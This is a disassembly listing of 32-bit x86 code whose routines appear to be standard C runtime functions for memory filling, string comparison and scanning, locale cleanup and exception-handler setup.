  427909:	mov    DWORD PTR [ebp-0x38],ebx
  42790c:	cmp    DWORD PTR [ebp+0x8],ebx
  42790f:	jne    0x427919
  427911:	mov    eax,ds:0x45dda4
  427916:	mov    DWORD PTR [ebp+0x8],eax
  427919:	cmp    DWORD PTR [ebp+0x20],ebx
  42791c:	jne    0x427926
  42791e:	mov    eax,ds:0x45ddb4
  427923:	mov    DWORD PTR [ebp+0x20],eax
  427926:	push   DWORD PTR [ebp+0x8]
  427929:	call   0x4285bd
  42792e:	pop    ecx
  42792f:	mov    DWORD PTR [ebp-0x3c],eax
  427932:	cmp    eax,0xffffffff
  427935:	jne    0x42793e
  427937:	xor    eax,eax
  427939:	jmp    0x427a5f
  42793e:	cmp    eax,DWORD PTR [ebp+0x20]
  427941:	je     0x427a35
  427947:	push   ebx
  427948:	push   ebx
  427949:	lea    ecx,[ebp+0x14]
  42794c:	push   ecx
  42794d:	push   DWORD PTR [ebp+0x10]
  427950:	push   eax
  427951:	push   DWORD PTR [ebp+0x20]
  427954:	call   0x428606
  427959:	add    esp,0x18
  42795c:	mov    DWORD PTR [ebp-0x34],eax
  42795f:	cmp    eax,ebx
  427961:	je     0x427937
  427963:	push   ebx
  427964:	push   ebx
  427965:	push   DWORD PTR [ebp+0x14]
  427968:	push   eax
  427969:	push   DWORD PTR [ebp+0xc]
  42796c:	push   DWORD PTR [ebp+0x8]
  42796f:	call   DWORD PTR ds:0x4290e8
  427975:	mov    esi,eax
  427977:	mov    DWORD PTR [ebp-0x40],esi
  42797a:	cmp    esi,ebx
  42797c:	je     0x427a24
  427982:	mov    DWORD PTR [ebp-0x4],ebx
  427985:	add    eax,0x3
  427988:	and    eax,0xfffffffc
  42798b:	call   0x425390
  427990:	mov    DWORD PTR [ebp-0x18],esp
  427993:	mov    edi,esp
  427995:	mov    DWORD PTR [ebp-0x44],edi
  427998:	push   esi
  427999:	push   ebx
  42799a:	push   edi
  42799b:	call   0x427c40
  4279a0:	add    esp,0xc
  4279a3:	jmp    0x4279b5
  4279a5:	xor    eax,eax
  4279a7:	inc    eax
  4279a8:	ret    
  4279a9:	mov    esp,DWORD PTR [ebp-0x18]
  4279ac:	call   0x4287d5
  4279b1:	xor    ebx,ebx
  4279b3:	xor    edi,edi
  4279b5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4279b9:	cmp    edi,ebx
  4279bb:	jne    0x4279e0
  4279bd:	push   DWORD PTR [ebp-0x40]
  4279c0:	call   0x426062
  4279c5:	pop    ecx
  4279c6:	mov    edi,eax
  4279c8:	cmp    edi,ebx
  4279ca:	je     0x4279fd
  4279cc:	push   DWORD PTR [ebp-0x40]
  4279cf:	push   ebx
  4279d0:	push   edi
  4279d1:	call   0x427c40
  4279d6:	add    esp,0xc
  4279d9:	mov    DWORD PTR [ebp-0x38],0x1
  4279e0:	push   DWORD PTR [ebp-0x40]
  4279e3:	push   edi
  4279e4:	push   DWORD PTR [ebp+0x14]
  4279e7:	push   DWORD PTR [ebp-0x34]
  4279ea:	push   DWORD PTR [ebp+0xc]
  4279ed:	push   DWORD PTR [ebp+0x8]
  4279f0:	call   DWORD PTR ds:0x4290e8
  4279f6:	mov    DWORD PTR [ebp-0x40],eax
  4279f9:	cmp    eax,ebx
  4279fb:	jne    0x427a01
  4279fd:	xor    esi,esi
  4279ff:	jmp    0x427a27
  427a01:	push   DWORD PTR [ebp+0x1c]
  427a04:	push   DWORD PTR [ebp+0x18]
  427a07:	lea    eax,[ebp-0x40]
  427a0a:	push   eax
  427a0b:	push   edi
  427a0c:	push   DWORD PTR [ebp+0x20]
  427a0f:	push   DWORD PTR [ebp-0x3c]
  427a12:	call   0x428606
  427a17:	add    esp,0x18
  427a1a:	mov    esi,eax
  427a1c:	neg    esi
  427a1e:	sbb    esi,esi
  427a20:	neg    esi
  427a22:	jmp    0x427a27
  427a24:	mov    esi,DWORD PTR [ebp-0x48]
  427a27:	cmp    DWORD PTR [ebp-0x38],ebx
  427a2a:	je     0x427a4f
  427a2c:	push   edi
  427a2d:	call   0x425f4a
  427a32:	pop    ecx
  427a33:	jmp    0x427a4f
  427a35:	push   DWORD PTR [ebp+0x1c]
  427a38:	push   DWORD PTR [ebp+0x18]
  427a3b:	push   DWORD PTR [ebp+0x14]
  427a3e:	push   DWORD PTR [ebp+0x10]
  427a41:	push   DWORD PTR [ebp+0xc]
  427a44:	push   DWORD PTR [ebp+0x8]
  427a47:	call   DWORD PTR ds:0x4290e8
  427a4d:	mov    esi,eax
  427a4f:	cmp    DWORD PTR [ebp-0x34],ebx
  427a52:	je     0x427a5d
  427a54:	push   DWORD PTR [ebp-0x34]
  427a57:	call   0x425f4a
  427a5c:	pop    ecx
  427a5d:	mov    eax,esi
  427a5f:	lea    esp,[ebp-0x54]
  427a62:	call   0x42537b
  427a67:	ret    
  427a68:	push   0x1c
  427a6a:	push   0x429e80
  427a6f:	call   0x425340
  427a74:	xor    esi,esi
  427a76:	cmp    DWORD PTR ds:0x45ddc0,esi
  427a7c:	jne    0x427ab3
  427a7e:	lea    eax,[ebp-0x1c]
  427a81:	push   eax
  427a82:	xor    edi,edi
  427a84:	inc    edi
  427a85:	push   edi
  427a86:	push   0x429e54
  427a8b:	push   edi
  427a8c:	call   DWORD PTR ds:0x4290f8
  427a92:	test   eax,eax
  427a94:	je     0x427a9e
  427a96:	mov    DWORD PTR ds:0x45ddc0,edi
  427a9c:	jmp    0x427ab3
  427a9e:	call   DWORD PTR ds:0x429044
  427aa4:	cmp    eax,0x78
  427aa7:	jne    0x427ab3
  427aa9:	mov    DWORD PTR ds:0x45ddc0,0x2
  427ab3:	mov    eax,ds:0x45ddc0
  427ab8:	cmp    eax,0x2
  427abb:	je     0x427bab
  427ac1:	cmp    eax,esi
  427ac3:	je     0x427bab
  427ac9:	cmp    eax,0x1
  427acc:	jne    0x427bd1
  427ad2:	mov    DWORD PTR [ebp-0x20],esi
  427ad5:	mov    DWORD PTR [ebp-0x24],esi
  427ad8:	cmp    DWORD PTR [ebp+0x18],esi
  427adb:	jne    0x427ae5
  427add:	mov    eax,ds:0x45ddb4
  427ae2:	mov    DWORD PTR [ebp+0x18],eax
  427ae5:	push   esi
  427ae6:	push   esi
  427ae7:	push   DWORD PTR [ebp+0x10]
  427aea:	push   DWORD PTR [ebp+0xc]
  427aed:	xor    eax,eax
  427aef:	cmp    DWORD PTR [ebp+0x20],esi
  427af2:	setne  al
  427af5:	lea    eax,[eax*8+0x1]
  427afc:	push   eax
  427afd:	push   DWORD PTR [ebp+0x18]
  427b00:	call   DWORD PTR ds:0x4290ec
  427b06:	mov    edi,eax
  427b08:	mov    DWORD PTR [ebp-0x28],edi
  427b0b:	test   edi,edi
  427b0d:	je     0x427bd1
  427b13:	and    DWORD PTR [ebp-0x4],0x0
  427b17:	lea    ebx,[edi+edi*1]
  427b1a:	mov    eax,ebx
  427b1c:	add    eax,0x3
  427b1f:	and    eax,0xfffffffc
  427b22:	call   0x425390
  427b27:	mov    DWORD PTR [ebp-0x18],esp
  427b2a:	mov    esi,esp
  427b2c:	mov    DWORD PTR [ebp-0x2c],esi
  427b2f:	push   ebx
  427b30:	push   0x0
  427b32:	push   esi
  427b33:	call   0x427c40
  427b38:	add    esp,0xc
  427b3b:	or     DWORD PTR [ebp-0x4],0xffffffff
  427b3f:	jmp    0x427b56
  427b41:	xor    eax,eax
  427b43:	inc    eax
  427b44:	ret    
  427b45:	mov    esp,DWORD PTR [ebp-0x18]
  427b48:	call   0x4287d5
  427b4d:	xor    esi,esi
  427b4f:	or     DWORD PTR [ebp-0x4],0xffffffff
  427b53:	mov    edi,DWORD PTR [ebp-0x28]
  427b56:	test   esi,esi
  427b58:	jne    0x427b71
  427b5a:	push   edi
  427b5b:	push   0x2
  427b5d:	call   0x426458
  427b62:	pop    ecx
  427b63:	pop    ecx
  427b64:	mov    esi,eax
  427b66:	test   esi,esi
  427b68:	je     0x427bd1
  427b6a:	mov    DWORD PTR [ebp-0x24],0x1
  427b71:	push   edi
  427b72:	push   esi
  427b73:	push   DWORD PTR [ebp+0x10]
  427b76:	push   DWORD PTR [ebp+0xc]
  427b79:	push   0x1
  427b7b:	push   DWORD PTR [ebp+0x18]
  427b7e:	call   DWORD PTR ds:0x4290ec
  427b84:	test   eax,eax
  427b86:	je     0x427b99
  427b88:	push   DWORD PTR [ebp+0x14]
  427b8b:	push   eax
  427b8c:	push   esi
  427b8d:	push   DWORD PTR [ebp+0x8]
  427b90:	call   DWORD PTR ds:0x4290f8
  427b96:	mov    DWORD PTR [ebp-0x20],eax
  427b99:	cmp    DWORD PTR [ebp-0x24],0x0
  427b9d:	je     0x427ba6
  427b9f:	push   esi
  427ba0:	call   0x425f4a
  427ba5:	pop    ecx
  427ba6:	mov    eax,DWORD PTR [ebp-0x20]
  427ba9:	jmp    0x427c19
  427bab:	mov    ebx,DWORD PTR [ebp+0x1c]
  427bae:	cmp    ebx,esi
  427bb0:	jne    0x427bb8
  427bb2:	mov    ebx,DWORD PTR ds:0x45dda4
  427bb8:	mov    edi,DWORD PTR [ebp+0x18]
  427bbb:	test   edi,edi
  427bbd:	jne    0x427bc5
  427bbf:	mov    edi,DWORD PTR ds:0x45ddb4
  427bc5:	push   ebx
  427bc6:	call   0x4285bd
  427bcb:	pop    ecx
  427bcc:	cmp    eax,0xffffffff
  427bcf:	jne    0x427bd5
  427bd1:	xor    eax,eax
  427bd3:	jmp    0x427c19
  427bd5:	cmp    eax,edi
  427bd7:	je     0x427bf7
  427bd9:	push   0x0
  427bdb:	push   0x0
  427bdd:	lea    ecx,[ebp+0x10]
  427be0:	push   ecx
  427be1:	push   DWORD PTR [ebp+0xc]
  427be4:	push   eax
  427be5:	push   edi
  427be6:	call   0x428606
  427beb:	add    esp,0x18
  427bee:	mov    esi,eax
  427bf0:	test   esi,esi
  427bf2:	je     0x427bd1
  427bf4:	mov    DWORD PTR [ebp+0xc],esi
  427bf7:	push   DWORD PTR [ebp+0x14]
  427bfa:	push   DWORD PTR [ebp+0x10]
  427bfd:	push   DWORD PTR [ebp+0xc]
  427c00:	push   DWORD PTR [ebp+0x8]
  427c03:	push   ebx
  427c04:	call   DWORD PTR ds:0x4290f4
  427c0a:	mov    edi,eax
  427c0c:	test   esi,esi
  427c0e:	je     0x427c17
  427c10:	push   esi
  427c11:	call   0x425f4a
  427c16:	pop    ecx
  427c17:	mov    eax,edi
  427c19:	lea    esp,[ebp-0x38]
  427c1c:	call   0x42537b
  427c21:	ret    
  427c22:	mov    eax,ds:0x45ddc4
  427c27:	test   eax,eax
  427c29:	je     0x427c3a
  427c2b:	push   DWORD PTR [esp+0x4]
  427c2f:	call   eax
  427c31:	test   eax,eax
  427c33:	pop    ecx
  427c34:	je     0x427c3a
  427c36:	xor    eax,eax
  427c38:	inc    eax
  427c39:	ret    
  427c3a:	xor    eax,eax
  427c3c:	ret    
  427c3d:	int3   
  427c3e:	int3   
  427c3f:	int3   
  427c40:	mov    edx,DWORD PTR [esp+0xc]
  427c44:	mov    ecx,DWORD PTR [esp+0x4]
  427c48:	test   edx,edx
  427c4a:	je     0x427c9b
  427c4c:	xor    eax,eax
  427c4e:	mov    al,BYTE PTR [esp+0x8]
  427c52:	push   edi
  427c53:	mov    edi,ecx
  427c55:	cmp    edx,0x4
  427c58:	jb     0x427c8b
  427c5a:	neg    ecx
  427c5c:	and    ecx,0x3
  427c5f:	je     0x427c6d
  427c61:	sub    edx,ecx
  427c63:	mov    BYTE PTR [edi],al
  427c65:	add    edi,0x1
  427c68:	sub    ecx,0x1
  427c6b:	jne    0x427c63
  427c6d:	mov    ecx,eax
  427c6f:	shl    eax,0x8
  427c72:	add    eax,ecx
  427c74:	mov    ecx,eax
  427c76:	shl    eax,0x10
  427c79:	add    eax,ecx
  427c7b:	mov    ecx,edx
  427c7d:	and    edx,0x3
  427c80:	shr    ecx,0x2
  427c83:	je     0x427c8b
  427c85:	rep stos DWORD PTR es:[edi],eax
  427c87:	test   edx,edx
  427c89:	je     0x427c95
  427c8b:	mov    BYTE PTR [edi],al
  427c8d:	add    edi,0x1
  427c90:	sub    edx,0x1
  427c93:	jne    0x427c8b
  427c95:	mov    eax,DWORD PTR [esp+0x8]
  427c99:	pop    edi
  427c9a:	ret    
  427c9b:	mov    eax,DWORD PTR [esp+0x4]
  427c9f:	ret    
  427ca0:	push   esi
  427ca1:	mov    esi,DWORD PTR [esp+0x8]
  427ca5:	test   esi,esi
  427ca7:	je     0x427e2e
  427cad:	push   DWORD PTR [esi+0x4]
  427cb0:	call   0x425f4a
  427cb5:	push   DWORD PTR [esi+0x8]
  427cb8:	call   0x425f4a
  427cbd:	push   DWORD PTR [esi+0xc]
  427cc0:	call   0x425f4a
  427cc5:	push   DWORD PTR [esi+0x10]
  427cc8:	call   0x425f4a
  427ccd:	push   DWORD PTR [esi+0x14]
  427cd0:	call   0x425f4a
  427cd5:	push   DWORD PTR [esi+0x18]
  427cd8:	call   0x425f4a
  427cdd:	push   DWORD PTR [esi]
  427cdf:	call   0x425f4a
  427ce4:	push   DWORD PTR [esi+0x20]
  427ce7:	call   0x425f4a
  427cec:	push   DWORD PTR [esi+0x24]
  427cef:	call   0x425f4a
  427cf4:	push   DWORD PTR [esi+0x28]
  427cf7:	call   0x425f4a
  427cfc:	push   DWORD PTR [esi+0x2c]
  427cff:	call   0x425f4a
  427d04:	push   DWORD PTR [esi+0x30]
  427d07:	call   0x425f4a
  427d0c:	push   DWORD PTR [esi+0x34]
  427d0f:	call   0x425f4a
  427d14:	push   DWORD PTR [esi+0x1c]
  427d17:	call   0x425f4a
  427d1c:	push   DWORD PTR [esi+0x38]
  427d1f:	call   0x425f4a
  427d24:	push   DWORD PTR [esi+0x3c]
  427d27:	call   0x425f4a
  427d2c:	add    esp,0x40
  427d2f:	push   DWORD PTR [esi+0x40]
  427d32:	call   0x425f4a
  427d37:	push   DWORD PTR [esi+0x44]
  427d3a:	call   0x425f4a
  427d3f:	push   DWORD PTR [esi+0x48]
  427d42:	call   0x425f4a
  427d47:	push   DWORD PTR [esi+0x4c]
  427d4a:	call   0x425f4a
  427d4f:	push   DWORD PTR [esi+0x50]
  427d52:	call   0x425f4a
  427d57:	push   DWORD PTR [esi+0x54]
  427d5a:	call   0x425f4a
  427d5f:	push   DWORD PTR [esi+0x58]
  427d62:	call   0x425f4a
  427d67:	push   DWORD PTR [esi+0x5c]
  427d6a:	call   0x425f4a
  427d6f:	push   DWORD PTR [esi+0x60]
  427d72:	call   0x425f4a
  427d77:	push   DWORD PTR [esi+0x64]
  427d7a:	call   0x425f4a
  427d7f:	push   DWORD PTR [esi+0x68]
  427d82:	call   0x425f4a
  427d87:	push   DWORD PTR [esi+0x6c]
  427d8a:	call   0x425f4a
  427d8f:	push   DWORD PTR [esi+0x70]
  427d92:	call   0x425f4a
  427d97:	push   DWORD PTR [esi+0x74]
  427d9a:	call   0x425f4a
  427d9f:	push   DWORD PTR [esi+0x78]
  427da2:	call   0x425f4a
  427da7:	push   DWORD PTR [esi+0x7c]
  427daa:	call   0x425f4a
  427daf:	add    esp,0x40
  427db2:	push   DWORD PTR [esi+0x80]
  427db8:	call   0x425f4a
  427dbd:	push   DWORD PTR [esi+0x84]
  427dc3:	call   0x425f4a
  427dc8:	push   DWORD PTR [esi+0x88]
  427dce:	call   0x425f4a
  427dd3:	push   DWORD PTR [esi+0x8c]
  427dd9:	call   0x425f4a
  427dde:	push   DWORD PTR [esi+0x90]
  427de4:	call   0x425f4a
  427de9:	push   DWORD PTR [esi+0x94]
  427def:	call   0x425f4a
  427df4:	push   DWORD PTR [esi+0x98]
  427dfa:	call   0x425f4a
  427dff:	push   DWORD PTR [esi+0x9c]
  427e05:	call   0x425f4a
  427e0a:	push   DWORD PTR [esi+0xa0]
  427e10:	call   0x425f4a
  427e15:	push   DWORD PTR [esi+0xa4]
  427e1b:	call   0x425f4a
  427e20:	push   DWORD PTR [esi+0xa8]
  427e26:	call   0x425f4a
  427e2b:	add    esp,0x2c
  427e2e:	pop    esi
  427e2f:	ret    
  427e30:	push   esi
  427e31:	mov    esi,DWORD PTR [esp+0x8]
  427e35:	test   esi,esi
  427e37:	je     0x427e8d
  427e39:	mov    eax,DWORD PTR [esi]
  427e3b:	mov    ecx,DWORD PTR ds:0x45d934
  427e41:	cmp    eax,DWORD PTR [ecx]
  427e43:	je     0x427e54
  427e45:	cmp    eax,DWORD PTR ds:0x45d904
  427e4b:	je     0x427e54
  427e4d:	push   eax
  427e4e:	call   0x425f4a
  427e53:	pop    ecx
  427e54:	mov    eax,DWORD PTR [esi+0x4]
  427e57:	mov    ecx,DWORD PTR ds:0x45d934
  427e5d:	cmp    eax,DWORD PTR [ecx+0x4]
  427e60:	je     0x427e71
  427e62:	cmp    eax,DWORD PTR ds:0x45d908
  427e68:	je     0x427e71
  427e6a:	push   eax
  427e6b:	call   0x425f4a
  427e70:	pop    ecx
  427e71:	mov    esi,DWORD PTR [esi+0x8]
  427e74:	mov    eax,ds:0x45d934
  427e79:	cmp    esi,DWORD PTR [eax+0x8]
  427e7c:	je     0x427e8d
  427e7e:	cmp    esi,DWORD PTR ds:0x45d90c
  427e84:	je     0x427e8d
  427e86:	push   esi
  427e87:	call   0x425f4a
  427e8c:	pop    ecx
  427e8d:	pop    esi
  427e8e:	ret    
  427e8f:	push   esi
  427e90:	mov    esi,DWORD PTR [esp+0x8]
  427e94:	test   esi,esi
  427e96:	je     0x427f66
  427e9c:	mov    eax,DWORD PTR [esi+0xc]
  427e9f:	mov    ecx,DWORD PTR ds:0x45d934
  427ea5:	cmp    eax,DWORD PTR [ecx+0xc]
  427ea8:	je     0x427eb9
  427eaa:	cmp    eax,DWORD PTR ds:0x45d910
  427eb0:	je     0x427eb9
  427eb2:	push   eax
  427eb3:	call   0x425f4a
  427eb8:	pop    ecx
  427eb9:	mov    eax,DWORD PTR [esi+0x10]
  427ebc:	mov    ecx,DWORD PTR ds:0x45d934
  427ec2:	cmp    eax,DWORD PTR [ecx+0x10]
  427ec5:	je     0x427ed6
  427ec7:	cmp    eax,DWORD PTR ds:0x45d914
  427ecd:	je     0x427ed6
  427ecf:	push   eax
  427ed0:	call   0x425f4a
  427ed5:	pop    ecx
  427ed6:	mov    eax,DWORD PTR [esi+0x14]
  427ed9:	mov    ecx,DWORD PTR ds:0x45d934
  427edf:	cmp    eax,DWORD PTR [ecx+0x14]
  427ee2:	je     0x427ef3
  427ee4:	cmp    eax,DWORD PTR ds:0x45d918
  427eea:	je     0x427ef3
  427eec:	push   eax
  427eed:	call   0x425f4a
  427ef2:	pop    ecx
  427ef3:	mov    eax,DWORD PTR [esi+0x18]
  427ef6:	mov    ecx,DWORD PTR ds:0x45d934
  427efc:	cmp    eax,DWORD PTR [ecx+0x18]
  427eff:	je     0x427f10
  427f01:	cmp    eax,DWORD PTR ds:0x45d91c
  427f07:	je     0x427f10
  427f09:	push   eax
  427f0a:	call   0x425f4a
  427f0f:	pop    ecx
  427f10:	mov    eax,DWORD PTR [esi+0x1c]
  427f13:	mov    ecx,DWORD PTR ds:0x45d934
  427f19:	cmp    eax,DWORD PTR [ecx+0x1c]
  427f1c:	je     0x427f2d
  427f1e:	cmp    eax,DWORD PTR ds:0x45d920
  427f24:	je     0x427f2d
  427f26:	push   eax
  427f27:	call   0x425f4a
  427f2c:	pop    ecx
  427f2d:	mov    eax,DWORD PTR [esi+0x20]
  427f30:	mov    ecx,DWORD PTR ds:0x45d934
  427f36:	cmp    eax,DWORD PTR [ecx+0x20]
  427f39:	je     0x427f4a
  427f3b:	cmp    eax,DWORD PTR ds:0x45d924
  427f41:	je     0x427f4a
  427f43:	push   eax
  427f44:	call   0x425f4a
  427f49:	pop    ecx
  427f4a:	mov    esi,DWORD PTR [esi+0x24]
  427f4d:	mov    eax,ds:0x45d934
  427f52:	cmp    esi,DWORD PTR [eax+0x24]
  427f55:	je     0x427f66
  427f57:	cmp    esi,DWORD PTR ds:0x45d928
  427f5d:	je     0x427f66
  427f5f:	push   esi
  427f60:	call   0x425f4a
  427f65:	pop    ecx
  427f66:	pop    esi
  427f67:	ret    
  427f68:	int3   
  427f69:	int3   
  427f6a:	int3   
  427f6b:	int3   
  427f6c:	int3   
  427f6d:	int3   
  427f6e:	int3   
  427f6f:	int3   
  427f70:	push   ebp
  427f71:	mov    ebp,esp
  427f73:	push   esi
  427f74:	xor    eax,eax
  427f76:	push   eax
  427f77:	push   eax
  427f78:	push   eax
  427f79:	push   eax
  427f7a:	push   eax
  427f7b:	push   eax
  427f7c:	push   eax
  427f7d:	push   eax
  427f7e:	mov    edx,DWORD PTR [ebp+0xc]
  427f81:	lea    ecx,[ecx+0x0]
  427f84:	mov    al,BYTE PTR [edx]
  427f86:	or     al,al
  427f88:	je     0x427f93
  427f8a:	add    edx,0x1
  427f8d:	bts    DWORD PTR [esp],eax
  427f91:	jmp    0x427f84
  427f93:	mov    esi,DWORD PTR [ebp+0x8]
  427f96:	or     ecx,0xffffffff
  427f99:	lea    ecx,[ecx+0x0]
  427f9c:	add    ecx,0x1
  427f9f:	mov    al,BYTE PTR [esi]
  427fa1:	or     al,al
  427fa3:	je     0x427fae
  427fa5:	add    esi,0x1
  427fa8:	bt     DWORD PTR [esp],eax
  427fac:	jae    0x427f9c
  427fae:	mov    eax,ecx
  427fb0:	add    esp,0x20
  427fb3:	pop    esi
  427fb4:	leave  
  427fb5:	ret    
  427fb6:	int3   
  427fb7:	int3   
  427fb8:	int3   
  427fb9:	int3   
  427fba:	int3   
  427fbb:	int3   
  427fbc:	int3   
  427fbd:	int3   
  427fbe:	int3   
  427fbf:	int3   
  427fc0:	mov    edx,DWORD PTR [esp+0x4]
  427fc4:	mov    ecx,DWORD PTR [esp+0x8]
  427fc8:	test   edx,0x3
  427fce:	jne    0x42800c
  427fd0:	mov    eax,DWORD PTR [edx]
  427fd2:	cmp    al,BYTE PTR [ecx]
  427fd4:	jne    0x428004
  427fd6:	or     al,al
  427fd8:	je     0x428000
  427fda:	cmp    ah,BYTE PTR [ecx+0x1]
  427fdd:	jne    0x428004
  427fdf:	or     ah,ah
  427fe1:	je     0x428000
  427fe3:	shr    eax,0x10
  427fe6:	cmp    al,BYTE PTR [ecx+0x2]
  427fe9:	jne    0x428004
  427feb:	or     al,al
  427fed:	je     0x428000
  427fef:	cmp    ah,BYTE PTR [ecx+0x3]
  427ff2:	jne    0x428004
  427ff4:	add    ecx,0x4
  427ff7:	add    edx,0x4
  427ffa:	or     ah,ah
  427ffc:	jne    0x427fd0
  427ffe:	mov    edi,edi
  428000:	xor    eax,eax
  428002:	ret    
  428003:	nop
  428004:	sbb    eax,eax
  428006:	shl    eax,1
  428008:	add    eax,0x1
  42800b:	ret    
  42800c:	test   edx,0x1
  428012:	je     0x42802c
  428014:	mov    al,BYTE PTR [edx]
  428016:	add    edx,0x1
  428019:	cmp    al,BYTE PTR [ecx]
  42801b:	jne    0x428004
  42801d:	add    ecx,0x1
  428020:	or     al,al
  428022:	je     0x428000
  428024:	test   edx,0x2
  42802a:	je     0x427fd0
  42802c:	mov    ax,WORD PTR [edx]
  42802f:	add    edx,0x2
  428032:	cmp    al,BYTE PTR [ecx]
  428034:	jne    0x428004
  428036:	or     al,al
  428038:	je     0x428000
  42803a:	cmp    ah,BYTE PTR [ecx+0x1]
  42803d:	jne    0x428004
  42803f:	or     ah,ah
  428041:	je     0x428000
  428043:	add    ecx,0x2
  428046:	jmp    0x427fd0
  428048:	int3   
  428049:	int3   
  42804a:	int3   
  42804b:	int3   
  42804c:	int3   
  42804d:	int3   
  42804e:	int3   
  42804f:	int3   
  428050:	mov    eax,DWORD PTR [esp+0xc]
  428054:	test   eax,eax
  428056:	je     0x4280a2
  428058:	mov    edx,DWORD PTR [esp+0x4]
  42805c:	push   esi
  42805d:	push   edi
  42805e:	mov    esi,edx
  428060:	mov    edi,DWORD PTR [esp+0x10]
  428064:	or     edx,edi
  428066:	and    edx,0x3
  428069:	je     0x4280a3
  42806b:	test   eax,0x1
  428070:	je     0x428083
  428072:	mov    cl,BYTE PTR [esi]
  428074:	cmp    cl,BYTE PTR [edi]
  428076:	jne    0x4280d0
  428078:	add    esi,0x1
  42807b:	add    edi,0x1
  42807e:	sub    eax,0x1
  428081:	je     0x4280a0
  428083:	mov    cl,BYTE PTR [esi]
  428085:	mov    dl,BYTE PTR [edi]
  428087:	cmp    cl,dl
  428089:	jne    0x4280d0
  42808b:	mov    cl,BYTE PTR [esi+0x1]
  42808e:	mov    dl,BYTE PTR [edi+0x1]
  428091:	cmp    cl,dl
  428093:	jne    0x4280d0
  428095:	add    edi,0x2
  428098:	add    esi,0x2
  42809b:	sub    eax,0x2
  42809e:	jne    0x428083
  4280a0:	pop    edi
  4280a1:	pop    esi
  4280a2:	ret    
  4280a3:	mov    ecx,eax
  4280a5:	and    eax,0x3
  4280a8:	shr    ecx,0x2
  4280ab:	je     0x4280d8
  4280ad:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4280af:	je     0x4280d8
  4280b1:	mov    ecx,DWORD PTR [esi-0x4]
  4280b4:	mov    edx,DWORD PTR [edi-0x4]
  4280b7:	cmp    cl,dl
  4280b9:	jne    0x4280cb
  4280bb:	cmp    ch,dh
  4280bd:	jne    0x4280cb
  4280bf:	shr    ecx,0x10
  4280c2:	shr    edx,0x10
  4280c5:	cmp    cl,dl
  4280c7:	jne    0x4280cb
  4280c9:	cmp    ch,dh
  4280cb:	mov    eax,0x0
  4280d0:	sbb    eax,eax
  4280d2:	pop    edi
  4280d3:	sbb    eax,0xffffffff
  4280d6:	pop    esi
  4280d7:	ret    
  4280d8:	test   eax,eax
  4280da:	je     0x4280a0
  4280dc:	mov    edx,DWORD PTR [esi]
  4280de:	mov    ecx,DWORD PTR [edi]
  4280e0:	cmp    dl,cl
  4280e2:	jne    0x4280cb
  4280e4:	sub    eax,0x1
  4280e7:	je     0x428105
  4280e9:	cmp    dh,ch
  4280eb:	jne    0x4280cb
  4280ed:	sub    eax,0x1
  4280f0:	je     0x428105
  4280f2:	and    ecx,0xff0000
  4280f8:	and    edx,0xff0000
  4280fe:	cmp    edx,ecx
  428100:	jne    0x4280cb
  428102:	sub    eax,0x1
  428105:	pop    edi
  428106:	pop    esi
  428107:	ret    
  428108:	int3   
  428109:	int3   
  42810a:	int3   
  42810b:	int3   
  42810c:	int3   
  42810d:	int3   
  42810e:	int3   
  42810f:	int3   
  428110:	push   ebp
  428111:	mov    ebp,esp
  428113:	push   edi
  428114:	push   esi
  428115:	push   ebx
  428116:	mov    ecx,DWORD PTR [ebp+0x10]
  428119:	jecxz  0x428142
  42811b:	mov    ebx,ecx
  42811d:	mov    edi,DWORD PTR [ebp+0x8]
  428120:	mov    esi,edi
  428122:	xor    eax,eax
  428124:	repnz scas al,BYTE PTR es:[edi]
  428126:	neg    ecx
  428128:	add    ecx,ebx
  42812a:	mov    edi,esi
  42812c:	mov    esi,DWORD PTR [ebp+0xc]
  42812f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428131:	mov    al,BYTE PTR [esi-0x1]
  428134:	xor    ecx,ecx
  428136:	cmp    al,BYTE PTR [edi-0x1]
  428139:	ja     0x428140
  42813b:	je     0x428142
  42813d:	sub    ecx,0x2
  428140:	not    ecx
  428142:	mov    eax,ecx
  428144:	pop    ebx
  428145:	pop    esi
  428146:	pop    edi
  428147:	leave  
  428148:	ret    
  428149:	int3   
  42814a:	int3   
  42814b:	int3   
  42814c:	int3   
  42814d:	int3   
  42814e:	int3   
  42814f:	int3   
  428150:	push   ebp
  428151:	mov    ebp,esp
  428153:	push   esi
  428154:	xor    eax,eax
  428156:	push   eax
  428157:	push   eax
  428158:	push   eax
  428159:	push   eax
  42815a:	push   eax
  42815b:	push   eax
  42815c:	push   eax
  42815d:	push   eax
  42815e:	mov    edx,DWORD PTR [ebp+0xc]
  428161:	lea    ecx,[ecx+0x0]
  428164:	mov    al,BYTE PTR [edx]
  428166:	or     al,al
  428168:	je     0x428173
  42816a:	add    edx,0x1
  42816d:	bts    DWORD PTR [esp],eax
  428171:	jmp    0x428164
  428173:	mov    esi,DWORD PTR [ebp+0x8]
  428176:	mov    edi,edi
  428178:	mov    al,BYTE PTR [esi]
  42817a:	or     al,al
  42817c:	je     0x42818a
  42817e:	add    esi,0x1
  428181:	bt     DWORD PTR [esp],eax
  428185:	jae    0x428178
  428187:	lea    eax,[esi-0x1]
  42818a:	add    esp,0x20
  42818d:	pop    esi
  42818e:	leave  
  42818f:	ret    
  428190:	push   ebp
  428191:	mov    ebp,esp
  428193:	push   ebx
  428194:	push   esi
  428195:	push   edi
  428196:	push   ebp
  428197:	push   0x0
  428199:	push   0x0
  42819b:	push   0x4281a8
  4281a0:	push   DWORD PTR [ebp+0x8]
  4281a3:	call   0x428c1e
  4281a8:	pop    ebp
  4281a9:	pop    edi
  4281aa:	pop    esi
  4281ab:	pop    ebx
  4281ac:	mov    esp,ebp
  4281ae:	pop    ebp
  4281af:	ret    
  4281b0:	mov    ecx,DWORD PTR [esp+0x4]
  4281b4:	test   DWORD PTR [ecx+0x4],0x6
  4281bb:	mov    eax,0x1
  4281c0:	je     0x4281d1
  4281c2:	mov    eax,DWORD PTR [esp+0x8]
  4281c6:	mov    edx,DWORD PTR [esp+0x10]
  4281ca:	mov    DWORD PTR [edx],eax
  4281cc:	mov    eax,0x3
  4281d1:	ret    
  4281d2:	push   ebx
  4281d3:	push   esi
  4281d4:	push   edi
  4281d5:	mov    eax,DWORD PTR [esp+0x10]
  4281d9:	push   eax
  4281da:	push   0xfffffffe
  4281dc:	push   0x4281b0
  4281e1:	push   DWORD PTR fs:0x0
  4281e8:	mov    DWORD PTR fs:0x0,esp
